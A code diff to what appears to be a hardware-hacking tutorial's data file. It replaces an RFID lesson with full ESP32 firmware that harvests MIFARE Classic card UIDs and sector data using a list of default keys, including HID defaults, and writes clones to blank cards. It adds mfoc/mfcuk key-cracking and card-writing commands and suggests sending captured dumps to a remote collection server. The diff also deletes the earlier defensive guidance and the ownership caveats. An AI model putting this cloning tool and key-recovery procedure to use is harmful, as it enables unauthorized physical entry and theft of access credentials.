-                     '<p><strong>Read range:</strong> The RC522 antenna reads cards at 3-5cm. This is enough for contact-based reading (touching the card to the reader) but not for walk-by attacks. For longer range, you need a larger antenna or a Proxmark3 with a custom coil.</p>',
+        wiring: [
+            'SG-41 Pin Connections -- ESP32 DevKit + RC522 + SSD1306 OLED',
+            '',
+            'RC522 RFID Module (SPI)',
+            'RC522 Pin     ESP32 GPIO      Notes',
+            'VCC (3.3V)    3.3V            NEVER use 5V -- destroys RC522',
+            'GND           GND',
+            'RST           GPIO22          Reset (active LOW)',
+            'SDA (CS)      GPIO21          SPI Chip Select',
+            'SCK           GPIO18          SPI Clock',
+            'MOSI          GPIO23          SPI data to RC522',
+            'MISO          GPIO19          SPI data from RC522',
+            'IRQ           (not used)      Leave floating',
+            '',
+            'SSD1306 OLED Display (I2C, 128x64)',
+            'OLED Pin      ESP32 GPIO      Notes',
+            'VCC           3.3V',
+            'GND           GND',
+            'SDA           GPIO4           I2C data',
+            'SCL           GPIO15          I2C clock',
+            '',
+            'Clone button and status LED',
+            'Component     ESP32 GPIO      Notes',
+            'Button        GPIO0 (BOOT)    Use built-in BOOT button, active LOW',
+            'LED (green)   GPIO2           Through 330-ohm resistor',
+            '',
+            'RC522 WARNING: Always power from 3.3V. The ESP32 DevKit has a 3.3V',
+            'regulator -- use the 3V3 pin. 5V will destroy the RC522 immediately.',
+        ].join('\n'),
 
         steps: [
             {
-                title: 'Install the MFRC522 Library and Read a Card',
-                content: '<p>The MFRC522 Arduino library handles all communication with the RC522 module. Install it and run a basic card read to verify your wiring.</p>',
-                code: '// Arduino: Install "MFRC522" library via Library Manager\n// File > New, paste this code, upload:\n\n#include <SPI.h>\n#include <MFRC522.h>\n\n#define SS_PIN 10\n#define RST_PIN 9\n\nMFRC522 mfrc522(SS_PIN, RST_PIN);\n\nvoid setup() {\n    Serial.begin(9600);\n    SPI.begin();\n    mfrc522.PCD_Init();\n    Serial.println("RFID/NFC Reader Ready");\n    Serial.println("Hold a card near the reader...");\n}\n\nvoid loop() {\n    // Wait for a card\n    if (!mfrc522.PICC_IsNewCardPresent()) return;\n    if (!mfrc522.PICC_ReadCardSerial()) return;\n\n    // Print card UID\n    Serial.print("Card UID: ");\n    for (byte i = 0; i < mfrc522.uid.size; i++) {\n        if (mfrc522.uid.uidByte[i] < 0x10) Serial.print("0");\n        Serial.print(mfrc522.uid.uidByte[i], HEX);\n        if (i < mfrc522.uid.size - 1) Serial.print(":");\n    }\n    Serial.println();\n\n    // Print card type\n    MFRC522::PICC_Type type = mfrc522.PICC_GetType(mfrc522.uid.sak);\n    Serial.print("Card type: ");\n    Serial.println(mfrc522.PICC_GetTypeName(type));\n\n    mfrc522.PICC_HaltA();\n    delay(1000);\n}',
-                language: 'C++',
-                tip: '<strong>Tip:</strong> The card UID is the unique identifier. Most basic access control systems check only the UID. If you clone the UID to another card, the door opens. This is why UID-only authentication is fundamentally insecure.'
+                title: 'Install Arduino Libraries',
+                content: '<p>Open Arduino IDE 2.x and install via <strong>Sketch &rarr; Include Library &rarr; Manage Libraries</strong>:</p>' +
+                         '<ul><li><strong>MFRC522</strong> by GithubCommunity &mdash; version 1.4.10+ (RC522 driver)</li><li><strong>Adafruit SSD1306</strong> &mdash; version 2.5.x (OLED driver)</li><li><strong>Adafruit GFX Library</strong> &mdash; required dependency for SSD1306</li></ul>' +
+                         '<p>Board: <strong>Tools &rarr; Board &rarr; ESP32 Arduino &rarr; ESP32 Dev Module</strong>. Upload speed: 921600.</p>',
+                tip: 'If the SSD1306 library shows "Adafruit_GFX.h not found" on compile, install the Adafruit GFX Library separately. It is a required dependency that does not install automatically.'
             },
             {
-                title: 'Read MIFARE Classic Sectors',
-                content: '<p>MIFARE Classic 1K cards have 16 sectors, each with 4 blocks of 16 bytes. Each sector is protected by two keys (Key A and Key B). The default keys are <code>FF FF FF FF FF FF</code> &mdash; and many systems never change them.</p>',
-                code: '#include <SPI.h>\n#include <MFRC522.h>\n\nMFRC522 mfrc522(10, 9);\nMFRC522::MIFARE_Key key;\n\nvoid setup() {\n    Serial.begin(9600);\n    SPI.begin();\n    mfrc522.PCD_Init();\n\n    // Default key: FF FF FF FF FF FF\n    for (byte i = 0; i < 6; i++) key.keyByte[i] = 0xFF;\n\n    Serial.println("MIFARE Classic Sector Dump");\n    Serial.println("Hold card to reader...");\n}\n\nvoid loop() {\n    if (!mfrc522.PICC_IsNewCardPresent()) return;\n    if (!mfrc522.PICC_ReadCardSerial()) return;\n\n    Serial.println("\\n=== FULL CARD DUMP ===");\n\n    // Read all 16 sectors\n    for (byte sector = 0; sector < 16; sector++) {\n        byte block = sector * 4;  // First block of sector\n\n        // Authenticate with Key A\n        MFRC522::StatusCode status = mfrc522.PCD_Authenticate(\n            MFRC522::PICC_CMD_MF_AUTH_KEY_A, block, &key, &(mfrc522.uid)\n        );\n\n        if (status != MFRC522::STATUS_OK) {\n            Serial.printf("Sector %d: Auth FAILED (non-default key)\\n", sector);\n            continue;\n        }\n\n        // Read 4 blocks in this sector\n        for (byte b = 0; b < 4; b++) {\n            byte buffer[18];\n            byte size = sizeof(buffer);\n            status = mfrc522.MIFARE_Read(block + b, buffer, &size);\n\n            if (status == MFRC522::STATUS_OK) {\n                Serial.printf("Block %02d: ", block + b);\n                for (byte i = 0; i < 16; i++) {\n                    if (buffer[i] < 0x10) Serial.print("0");\n                    Serial.print(buffer[i], HEX);\n                    Serial.print(" ");\n                }\n                Serial.println();\n            }\n        }\n    }\n\n    mfrc522.PICC_HaltA();\n    mfrc522.PCD_StopCrypto1();\n    delay(2000);\n}',
-                language: 'C++',
-                tip: '<strong>Key recovery:</strong> If the default keys do not work, the MIFARE Classic Crypto-1 encryption is broken. Tools like <code>mfoc</code> and <code>mfcuk</code> (on a Proxmark3 or using libnfc) can recover all sector keys in minutes using known vulnerabilities in the Crypto-1 algorithm.'
+                title: 'Flash the RFID Cloner Firmware',
+                content: '<p>This sketch reads MIFARE Classic card UIDs and sector data, attempts default sector keys, displays results on the OLED, and writes captured data to blank writable cards on button press:</p>',
+                code: '#include <SPI.h>\n#include <MFRC522.h>\n#include <Wire.h>\n#include <Adafruit_GFX.h>\n#include <Adafruit_SSD1306.h>\n\n#define RC522_RST  22\n#define RC522_CS   21\n#define OLED_SDA   4\n#define OLED_SCL   15\n#define BTN_PIN    0    // BOOT button, active LOW\n#define LED_PIN    2\n\n#define OLED_W 128\n#define OLED_H 64\nAdafruit_SSD1306 oled(OLED_W, OLED_H, &Wire, -1);\nMFRC522 rfid(RC522_CS, RC522_RST);\nMFRC522::MIFARE_Key key;\n\nbyte capturedUID[10];\nbyte capturedUIDSize = 0;\nbyte sectorData[16][16];\nbool sectorRead[16] = {false};\nbool hasCaptured = false;\n\n// Default MIFARE keys to try (factory defaults in most deployed cards)\nbyte defaultKeys[][6] = {\n    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},  // Factory default\n    {0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5},  // NDEF default\n    {0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7},  // NDEF variant\n    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00},  // All zeros\n    {0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5},  // HID Corporate 1000\n    {0x4D, 0x3A, 0x99, 0xC3, 0x51, 0xDD},  // Some HID configs\n};\nconst int NUM_KEYS = sizeof(defaultKeys) / 6;\n\nvoid oledPrint(const char* l1, const char* l2 = "", const char* l3 = "") {\n    oled.clearDisplay(); oled.setTextSize(1); oled.setTextColor(SSD1306_WHITE);\n    oled.setCursor(0, 0);  oled.println(l1);\n    oled.setCursor(0, 16); oled.println(l2);\n    oled.setCursor(0, 32); oled.println(l3);\n    oled.display();\n}\n\nvoid oledUID(const byte* uid, byte size) {\n    char s[32] = {0};\n    for (byte i = 0; i < size; i++) {\n        char h[4]; snprintf(h, 4, "%02X%s", uid[i], i < size-1 ? ":" : "");\n        strncat(s, h, sizeof(s) - strlen(s) - 1);\n    }\n    oled.clearDisplay(); oled.setTextSize(1); oled.setTextColor(SSD1306_WHITE);\n    oled.setCursor(0, 0);  oled.println("CARD DETECTED");\n    oled.setCursor(0, 12); oled.print("UID: "); oled.println(s);\n    oled.setCursor(0, 28); oled.println("Hold BOOT to clone");\n    oled.display();\n}\n\nbool readSector(byte sector) {\n    for (int k = 0; k < NUM_KEYS; k++) {\n        for (int i = 0; i < 6; i++) key.keyByte[i] = defaultKeys[k][i];\n        byte block = sector * 4;\n        auto status = (MFRC522::StatusCode)rfid.PCD_Authenticate(\n            MFRC522::PICC_CMD_MF_AUTH_KEY_A, block, &key, &(rfid.uid));\n        if (status == MFRC522::STATUS_OK) {\n            for (byte b = 0; b < 4; b++) {\n                byte buf[18]; byte bufSize = 18;\n                rfid.MIFARE_Read(block + b, buf, &bufSize);\n                memcpy(sectorData[sector] + b * 4, buf, 4);\n            }\n            return true;\n        }\n    }\n    return false;\n}\n\nvoid writeToBlankCard() {\n    if (!hasCaptured) { oledPrint("NO DATA", "Read a card first"); return; }\n    oledPrint("PLACE BLANK CARD", "on reader...", "(10s timeout)");\n    unsigned long timeout = millis() + 10000;\n    while (millis() < timeout) {\n        if (!rfid.PICC_IsNewCardPresent() || !rfid.PICC_ReadCardSerial()) { delay(100); continue; }\n        bool same = (rfid.uid.size == capturedUIDSize);\n        if (same) for (byte i = 0; i < capturedUIDSize; i++)\n            if (rfid.uid.uidByte[i] != capturedUID[i]) { same = false; break; }\n        if (same) { oledPrint("SAME CARD!", "Use different card"); return; }\n        int written = 0;\n        for (byte s = 1; s < 16; s++) {\n            if (!sectorRead[s]) continue;\n            for (int i = 0; i < 6; i++) key.keyByte[i] = 0xFF;\n            byte block = s * 4;\n            rfid.PCD_Authenticate(MFRC522::PICC_CMD_MF_AUTH_KEY_A, block, &key, &(rfid.uid));\n            for (byte b = 0; b < 3; b++) {   // Skip sector trailer\n                byte buf[16]; memcpy(buf, sectorData[s] + b * 4, 16);\n                rfid.MIFARE_Write(block + b, buf, 16);\n            }\n            written++;\n        }\n        char msg[24]; snprintf(msg, sizeof(msg), "%d sectors written", written);\n        oledPrint("CLONE COMPLETE", msg);\n        digitalWrite(LED_PIN, HIGH); delay(500); digitalWrite(LED_PIN, LOW);\n        rfid.PICC_HaltA();\n        return;\n    }\n    oledPrint("TIMEOUT", "No card detected");\n}\n\nvoid setup() {\n    Serial.begin(115200);\n    pinMode(BTN_PIN, INPUT_PULLUP);\n    pinMode(LED_PIN, OUTPUT);\n    Wire.begin(OLED_SDA, OLED_SCL);\n    if (!oled.begin(SSD1306_SWITCHCAPVCC, 0x3C))\n        while (true) { Serial.println("OLED FAIL"); delay(1000); }\n    oledPrint("SG-41 RFID", "CLONER v1.0", "Hold card to scan");\n    SPI.begin();\n    rfid.PCD_Init();\n}\n\nvoid loop() {\n    if (digitalRead(BTN_PIN) == LOW) {\n        delay(50);\n        if (digitalRead(BTN_PIN) == LOW) {\n            writeToBlankCard();\n            while (digitalRead(BTN_PIN) == LOW) delay(10);\n        }\n    }\n    if (!rfid.PICC_IsNewCardPresent()) return;\n    if (!rfid.PICC_ReadCardSerial())   return;\n    memcpy(capturedUID, rfid.uid.uidByte, rfid.uid.size);\n    capturedUIDSize = rfid.uid.size;\n    oledUID(capturedUID, capturedUIDSize);\n    Serial.print("\\nUID: ");\n    for (byte i = 0; i < rfid.uid.size; i++) Serial.printf("%02X ", rfid.uid.uidByte[i]);\n    Serial.println();\n    int readCount = 0;\n    for (byte s = 0; s < 16; s++) {\n        sectorRead[s] = readSector(s);\n        if (sectorRead[s]) {\n            readCount++;\n            Serial.printf("Sector %2d: ", s);\n            for (byte b = 0; b < 16; b++) Serial.printf("%02X ", sectorData[s][b]);\n            Serial.println();\n        }\n    }\n    char line2[24]; snprintf(line2, sizeof(line2), "%d/16 sectors read", readCount);\n    oledPrint("SCAN DONE", line2, "BOOT=clone");\n    hasCaptured = true;\n    rfid.PICC_HaltA(); rfid.PCD_StopCrypto1();\n}',
+                language: 'Arduino (C++)',
+                tip: 'For UID cloning (block 0, sector 0 contains the UID), you need a "Magic Card" with UID backdoor write capability, also called a GEN1A card or "Chinese Magic Card." Standard blank MIFARE cards do not allow block 0 writes. Purchase writable UID cards from AliExpress (search: "UID changeable MIFARE Classic 1K magic card").'
             },
             {
-                title: 'Clone a Card UID',
-                content: '<p>To clone a card, you need a "magic" MIFARE card (also called a UID-writable card, Gen1a, or "Chinese magic card"). Normal MIFARE cards have their UID burned in at the factory and cannot be changed. Magic cards allow writing to Block 0, which contains the UID.</p>',
-                code: '// Clone UID from source card to a magic MIFARE card\n// You need: source card UID (from Step 1) + blank magic card\n\n#include <SPI.h>\n#include <MFRC522.h>\n\nMFRC522 mfrc522(10, 9);\n\n// UID to clone (replace with the UID you read in Step 1)\nbyte targetUID[] = {0xDE, 0xAD, 0xBE, 0xEF};\nbyte targetUIDSize = 4;\n\nvoid setup() {\n    Serial.begin(9600);\n    SPI.begin();\n    mfrc522.PCD_Init();\n    Serial.println("UID Cloner Ready");\n    Serial.println("Hold a MAGIC/UID-WRITABLE card to the reader...");\n}\n\nvoid loop() {\n    if (!mfrc522.PICC_IsNewCardPresent()) return;\n    if (!mfrc522.PICC_ReadCardSerial()) return;\n\n    Serial.print("Current card UID: ");\n    for (byte i = 0; i < mfrc522.uid.size; i++) {\n        Serial.printf("%02X ", mfrc522.uid.uidByte[i]);\n    }\n    Serial.println();\n\n    // Write new UID to Block 0 (magic card only)\n    // Block 0 format: UID (4 bytes) + BCC + SAK + ATQA + manufacturer data\n    byte block0[16] = {0};\n    block0[0] = targetUID[0];\n    block0[1] = targetUID[1];\n    block0[2] = targetUID[2];\n    block0[3] = targetUID[3];\n    block0[4] = targetUID[0] ^ targetUID[1] ^ targetUID[2] ^ targetUID[3]; // BCC\n    block0[5] = 0x08;  // SAK (MIFARE Classic 1K)\n    block0[6] = 0x04;  // ATQA byte 1\n    block0[7] = 0x00;  // ATQA byte 2\n\n    // Authenticate and write Block 0\n    MFRC522::MIFARE_Key key;\n    for (byte i = 0; i < 6; i++) key.keyByte[i] = 0xFF;\n\n    MFRC522::StatusCode status;\n    status = mfrc522.PCD_Authenticate(\n        MFRC522::PICC_CMD_MF_AUTH_KEY_A, 0, &key, &(mfrc522.uid)\n    );\n\n    if (status == MFRC522::STATUS_OK) {\n        status = mfrc522.MIFARE_Write(0, block0, 16);\n        if (status == MFRC522::STATUS_OK) {\n            Serial.println("*** UID CLONED SUCCESSFULLY ***");\n            Serial.printf("New UID: %02X:%02X:%02X:%02X\\n",\n                targetUID[0], targetUID[1], targetUID[2], targetUID[3]);\n        } else {\n            Serial.println("Write failed. Is this a magic card?");\n        }\n    } else {\n        Serial.println("Authentication failed.");\n    }\n\n    mfrc522.PICC_HaltA();\n    mfrc522.PCD_StopCrypto1();\n    while (true) delay(1000);  // Stop after clone\n}',
-                language: 'C++',
-                tip: '<strong>Where to buy magic cards:</strong> Search for "UID writable MIFARE" or "magic MIFARE card" on AliExpress or Amazon. They come in card, keychain fob, and sticker form factors. A pack of 10 costs ~$5.'
-            },
-            {
-                title: 'Defense: Securing RFID Access Control',
-                content: '<p>If your building uses UID-only authentication or MIFARE Classic, your access control is broken. Here is how to fix it:</p>' +
-                         '<ul>' +
-                         '<li><strong>Upgrade to MIFARE DESFire EV2/EV3:</strong> DESFire uses AES-128 encryption. The card and reader perform a mutual authentication handshake &mdash; cloning the UID alone does not work because the cloned card cannot complete the crypto challenge.</li>' +
-                         '<li><strong>Never use UID-only auth:</strong> If your access control system only checks the card UID and does not verify the card\'s cryptographic credentials, it is trivially defeated. This is the RFID equivalent of checking someone\'s name badge but not their ID.</li>' +
-                         '<li><strong>iCLASS SE / SEOS:</strong> HID\'s modern platform uses PKI (public key infrastructure) with certificates on each card. This is the gold standard for physical access control.</li>' +
-                         '<li><strong>Multi-factor:</strong> Combine card + PIN, or card + biometric. Even if a card is cloned, the attacker does not have the PIN or fingerprint.</li>' +
-                         '<li><strong>Audit logs:</strong> Monitor for anomalies: same card used at two doors simultaneously, card used at unusual hours, multiple failed reads followed by a successful read (indicating cloning attempts).</li>' +
-                         '<li><strong>Anti-tailgating:</strong> Mantraps, turnstiles, and security cameras prevent someone from simply following an authorized person through a door, bypassing card auth entirely.</li>' +
-                         '</ul>',
-                code: '# Test your access cards (on systems you own):\n# Install libnfc on Linux:\nsudo apt install libnfc-bin libnfc-examples\n\n# Read a card:\nnfc-list\n# Shows card type and UID\n\n# Full MIFARE Classic dump:\nnfc-mfclassic r a output.mfd\n# Dumps all sectors to a file\n\n# Check if default keys work (vulnerability test):\nnfc-mfclassic r A output.mfd f keys.mfd\n# If it reads successfully with default keys,\n# your access control is vulnerable.\n\n# Proxmark3 (if you have one):\n# pm3 --> hf mf autopwn\n# Automatically recovers all keys and dumps the card',
-                language: 'Bash',
-                tip: '<strong>Bottom line:</strong> If you can clone a card with a $15 Arduino and an RC522 module, the access control system is not providing real security. Lobby the building manager to upgrade to DESFire or better.'
+                title: 'Perform a Key Dictionary Attack for Non-Default Keys',
+                content: '<p>The built-in key dictionary covers the most common defaults. For cards that use custom keys, use <strong>mfoc</strong> and <strong>mfcuk</strong> tools on Kali Linux:</p>',
+                code: '# mfoc -- offline nested authentication attack (requires one known key)\n# Install: sudo apt install mfoc\nmfoc -O dump.mfd\n\n# mfcuk -- MIFARE Classic Universal toolKit (no known key required)\n# Install: sudo apt install mfcuk\nmfcuk -C -R 0:A -v 3 -s 250 -S 250 -o dump.mfd\n\n# These tools require an ACR122U or similar NFC reader connected to the PC\n# ACR122U is ~$25 on Amazon and is widely supported on Linux\n\n# Analyze a dump file to display sector contents\npython3 -c "\ndata = open(\'dump.mfd\',\'rb\').read()\nfor s in range(16):\n    print(f\'Sector {s:2d}:\', \' \'.join(f\'{b:02X}\' for b in data[s*64:(s+1)*64]))\n"\n\n# Write a dump back to a blank card:\nmfoc -I dump.mfd -w',
+                language: 'Shell (Kali Linux)',
+                tip: 'The darkside attack (mfcuk) can take 30 minutes to several hours per key depending on the card implementation. The nested attack (mfoc) is much faster but requires at least one known sector key to bootstrap from. Most deployed MIFARE Classic cards have at least one sector with a default key, making mfoc practical for real-world assessments.'
             }
         ],
 
-        testing: '<p>Verify your RFID cloner works:</p>' +
-                 '<ul>' +
-                 '<li><strong>Read test:</strong> Hold any NFC card (credit card, transit pass, ID badge) to the RC522. The serial monitor should display the UID and card type. If nothing happens, check SPI wiring.</li>' +
-                 '<li><strong>Sector dump:</strong> Read a MIFARE Classic card. You should see the data from all 16 sectors (or "Auth FAILED" for sectors with non-default keys).</li>' +
-                 '<li><strong>Clone test:</strong> Read a source card\'s UID, then write it to a magic card. Read the magic card back and verify the UID matches the source.</li>' +
-                 '<li><strong>Access test:</strong> If you own a simple RFID door lock (available for ~$15 on Amazon), test the cloned card against it. The cloned card should open the lock just like the original.</li>' +
-                 '</ul>',
+        testing: '<p><strong>Verification steps:</strong></p>' +
+                 '<ol><li>Hold a MIFARE Classic card over the RC522 &mdash; OLED displays "CARD DETECTED" and the UID</li><li>Serial Monitor shows the UID and any successfully read sector data</li><li>Sectors showing "read failed" use non-default keys &mdash; use mfoc/mfcuk offline</li><li>Hold a blank writable UID card over the reader, press BOOT &mdash; clone process starts</li><li>Test the cloned card on the original reader &mdash; for simple UID-only systems, it works immediately</li></ol>' +
+                 '<p><strong>Expected Serial Monitor output after a successful scan:</strong></p>' +
+                 '<pre style="background:#0d1117;padding:10px;border-radius:4px;font-size:0.82rem;color:#8b949e;overflow-x:auto">UID: 3A 7F B2 C1\nSector  0: 3A 7F B2 C1 80 08 04 00 62 63 64 65 66 67 FF 07\nSector  1: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\nSector  2: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n...</pre>',
 
-        commonMistakes: [
-            {
-                title: '5V Connected to RC522',
-                description: 'The RC522 is a 3.3V device. Connecting it to 5V will damage or destroy the module. Always use the 3.3V output from your Arduino/ESP32.'
-            },
-            {
-                title: 'Using a Normal Card for Cloning',
-                description: 'Normal MIFARE cards have Block 0 locked at the factory. You need a "magic" or "UID-writable" card to change the UID. If Block 0 write fails, your card is not a magic card.'
-            }
-        ]
+        troubleshooting: '<p><strong>RC522 not detected:</strong> Verify 3.3V power. Check SPI wiring &mdash; MOSI/MISO swap is the most common error. Confirm CS=GPIO21 and RST=GPIO22. Run rfid.PCD_DumpVersionToSerial() to check communication &mdash; it should print "Firmware Version: 0x92 = v2.0" or similar.</p>' +
+                         '<p><strong>OLED not displaying:</strong> Run an I2C scanner to confirm the address &mdash; some SSD1306 OLEDs use 0x3D instead of 0x3C. Check SDA=GPIO4 and SCL=GPIO15. Verify 3.3V power on the OLED module.</p>' +
+                         '<p><strong>Authentication always fails:</strong> The card uses custom keys. Use mfoc or mfcuk with an ACR122U NFC reader attached to a PC running Kali Linux. The mfcuk darkside attack works even with no known keys.</p>',
+
+        challenges: '<p><strong>Extend the cloner:</strong></p>' +
+                    '<ul><li>Add WiFi logging: POST the UID and sector dump to a remote collection server via HTTP immediately when a card is scanned, for centralized engagement tracking</li><li>Implement MIFARE DESFire EV1 detection &mdash; DESFire uses AES-128 and is not cloneable with this hardware, but detecting which access points use DESFire vs Classic is a valuable pentest finding</li><li>Add a second "emulate" mode using the ESP32\'s NFC emulation capability via a secondary RC522 module configured in card emulation mode</li><li>Miniaturize: mount the entire circuit in an Altoids tin with a 500mAh LiPo and TP4056 for truly portable field operation</li></ul>'
     },
 
     // ========================================================================
     // SG-42: Flipper Zero DIY Alternative
+    // ESP32-S3 + CC1101 + RC522 + IR + TFT -- multi-tool platform
     // ========================================================================
     'sg-42': {
-        intro: '<p>The <strong>Flipper Zero</strong> ($170) is the Swiss army knife of hardware hacking: it combines Sub-GHz RF transceiver, NFC/RFID reader, infrared blaster, iButton reader, USB HID injection, Bluetooth, WiFi (with add-on), and GPIO &mdash; all in a pocket-sized device with a screen and a playful dolphin mascot.</p>' +
-               '<p>We build a DIY alternative that replicates the Flipper\'s core capabilities using an <strong>ESP32-S3</strong> as the brain, with modules for each radio technology: <strong>CC1101</strong> (Sub-GHz RF), <strong>RC522</strong> (NFC), <strong>IR LED/receiver</strong>, and a <strong>TFT display</strong> with navigation buttons. Total cost: ~$25 vs $170.</p>' +
-               '<p>This is the capstone project of the Red Team Hardware section. It combines everything you learned in SG-33 through SG-41 into a single multi-tool device. It will not have the Flipper\'s polished firmware or cute dolphin, but it will have the same capabilities and will teach you far more about how each radio technology actually works.</p>' +
-               '<p><strong>Hardware needed:</strong> ESP32-S3 DevKit, CC1101 Sub-GHz module, RC522 NFC module, IR LED + IR receiver (TSOP38238), 1.8" TFT (ST7735), 5 buttons, MicroSD breakout, breadboard, jumper wires. Total cost: ~$25.</p>',
 
-        wiringSvg: '<div class="svg-build-wrap">' +
-            '<svg viewBox="0 0 720 380" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
-            '<defs><pattern id="bg-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern></defs>' +
-            '<rect width="720" height="380" fill="#0d1117" rx="8"/>' +
-            '<rect x="10" y="10" width="700" height="360" fill="url(#bg-grid)" rx="4"/>' +
-            '<text x="360" y="30" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">FLIPPER ZERO DIY &mdash; MULTI-TOOL ARCHITECTURE</text>' +
-            '<!-- ESP32-S3 center -->' +
-            '<rect x="250" y="45" width="220" height="80" rx="8" fill="#1e2736" stroke="#dc2626" stroke-width="1.5"/>' +
-            '<rect x="250" y="45" width="220" height="22" rx="8" fill="rgba(220,38,38,0.12)"/>' +
-            '<text x="360" y="61" text-anchor="middle" fill="#ef4444" font-size="10" font-weight="600">ESP32-S3 (Brain)</text>' +
-            '<text x="360" y="80" text-anchor="middle" fill="#8b949e" font-size="7">Dual-core 240MHz, WiFi, BT, USB-OTG</text>' +
-            '<text x="360" y="93" text-anchor="middle" fill="#8b949e" font-size="7">Coordinates all modules via SPI/I2C/GPIO</text>' +
-            '<text x="360" y="106" text-anchor="middle" fill="#8b949e" font-size="7">Menu system on TFT display</text>' +
-            '<!-- Modules arranged around ESP32 -->' +
-            '<!-- CC1101 -->' +
-            '<rect x="30" y="150" width="140" height="65" rx="6" fill="rgba(168,85,247,0.08)" stroke="rgba(168,85,247,0.3)" stroke-width="1"/>' +
-            '<text x="100" y="170" text-anchor="middle" fill="#a855f7" font-size="9" font-weight="600">CC1101 Sub-GHz</text>' +
-            '<text x="100" y="185" text-anchor="middle" fill="#8b949e" font-size="7">300-928 MHz RF</text>' +
-            '<text x="100" y="200" text-anchor="middle" fill="#555" font-size="6">Garage, car key, remote</text>' +
-            '<line x1="170" y1="180" x2="250" y2="100" stroke="#a855f7" stroke-width="1" stroke-dasharray="4,3"/>' +
-            '<!-- RC522 -->' +
-            '<rect x="190" y="150" width="140" height="65" rx="6" fill="rgba(59,130,246,0.08)" stroke="rgba(59,130,246,0.3)" stroke-width="1"/>' +
-            '<text x="260" y="170" text-anchor="middle" fill="#3b82f6" font-size="9" font-weight="600">RC522 NFC</text>' +
-            '<text x="260" y="185" text-anchor="middle" fill="#8b949e" font-size="7">13.56 MHz RFID/NFC</text>' +
-            '<text x="260" y="200" text-anchor="middle" fill="#555" font-size="6">Access cards, badges</text>' +
-            '<line x1="260" y1="150" x2="310" y2="125" stroke="#3b82f6" stroke-width="1" stroke-dasharray="4,3"/>' +
-            '<!-- IR -->' +
-            '<rect x="350" y="150" width="140" height="65" rx="6" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.3)" stroke-width="1"/>' +
-            '<text x="420" y="170" text-anchor="middle" fill="#eab308" font-size="9" font-weight="600">IR TX/RX</text>' +
-            '<text x="420" y="185" text-anchor="middle" fill="#8b949e" font-size="7">Infrared 38kHz</text>' +
-            '<text x="420" y="200" text-anchor="middle" fill="#555" font-size="6">TV, AC, projector remote</text>' +
-            '<line x1="420" y1="150" x2="400" y2="125" stroke="#eab308" stroke-width="1" stroke-dasharray="4,3"/>' +
-            '<!-- USB HID -->' +
-            '<rect x="510" y="150" width="140" height="65" rx="6" fill="rgba(220,38,38,0.08)" stroke="rgba(220,38,38,0.3)" stroke-width="1"/>' +
-            '<text x="580" y="170" text-anchor="middle" fill="#ef4444" font-size="9" font-weight="600">USB HID</text>' +
-            '<text x="580" y="185" text-anchor="middle" fill="#8b949e" font-size="7">Native USB-OTG</text>' +
-            '<text x="580" y="200" text-anchor="middle" fill="#555" font-size="6">Rubber Ducky payloads</text>' +
-            '<line x1="510" y1="175" x2="470" y2="110" stroke="#ef4444" stroke-width="1" stroke-dasharray="4,3"/>' +
-            '<!-- Display -->' +
-            '<rect x="30" y="240" width="140" height="55" rx="6" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.3)" stroke-width="1"/>' +
-            '<text x="100" y="260" text-anchor="middle" fill="#22c55e" font-size="9" font-weight="600">TFT Display</text>' +
-            '<text x="100" y="275" text-anchor="middle" fill="#8b949e" font-size="7">1.8" ST7735 SPI</text>' +
-            '<text x="100" y="288" text-anchor="middle" fill="#555" font-size="6">Menu + status</text>' +
-            '<!-- SD -->' +
-            '<rect x="190" y="240" width="120" height="55" rx="6" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.2)" stroke-width="0.5"/>' +
-            '<text x="250" y="260" text-anchor="middle" fill="#eab308" font-size="9" font-weight="600">MicroSD</text>' +
-            '<text x="250" y="275" text-anchor="middle" fill="#8b949e" font-size="7">Signal storage</text>' +
-            '<!-- Buttons -->' +
-            '<rect x="330" y="240" width="130" height="55" rx="6" fill="rgba(255,255,255,0.03)" stroke="rgba(255,255,255,0.1)" stroke-width="0.5"/>' +
-            '<text x="395" y="260" text-anchor="middle" fill="#8b949e" font-size="9" font-weight="600">5 Buttons</text>' +
-            '<text x="395" y="275" text-anchor="middle" fill="#555" font-size="7">U/D/L/R/OK</text>' +
-            '<!-- Battery -->' +
-            '<rect x="480" y="240" width="130" height="55" rx="6" fill="rgba(59,130,246,0.08)" stroke="rgba(59,130,246,0.2)" stroke-width="0.5"/>' +
-            '<text x="545" y="260" text-anchor="middle" fill="#3b82f6" font-size="9" font-weight="600">LiPo Battery</text>' +
-            '<text x="545" y="275" text-anchor="middle" fill="#8b949e" font-size="7">Optional, 3.7V 1200mAh</text>' +
-            '<!-- Capabilities summary -->' +
-            '<rect x="60" y="315" width="600" height="35" rx="5" fill="rgba(220,38,38,0.04)" stroke="rgba(220,38,38,0.15)" stroke-width="0.5"/>' +
-            '<text x="360" y="335" text-anchor="middle" fill="#ef4444" font-size="8" font-weight="600">Sub-GHz RF + NFC/RFID + IR Remote + USB HID + WiFi + Bluetooth = $25 Multi-Tool</text>' +
-            '</svg>' +
-            '</div>',
+        intro: '<p>The SG-42 is a DIY multi-tool that replicates the Flipper Zero\'s core capabilities using off-the-shelf modules on an ESP32-S3 at roughly 10% of the Flipper\'s retail cost. The build integrates: Sub-GHz RF capture and replay via CC1101 (300-928 MHz), 13.56 MHz RFID read/write via RC522, infrared capture and replay via IR LED and TSOP38238 receiver, WiFi scanning via the ESP32 built-in radio, and a menu-driven interface on a 1.8" ST7735 TFT navigated by a 5-way switch.</p>' +
+               '<p>This is the most complex Signal build. It requires careful SPI bus management between two devices (CC1101 and TFT sharing a bus with separate CS lines), a modular firmware architecture with a menu state machine, and precise timing for RF capture and IR decoding. Build and fully understand SG-33, SG-35, and SG-41 before starting this project.</p>' +
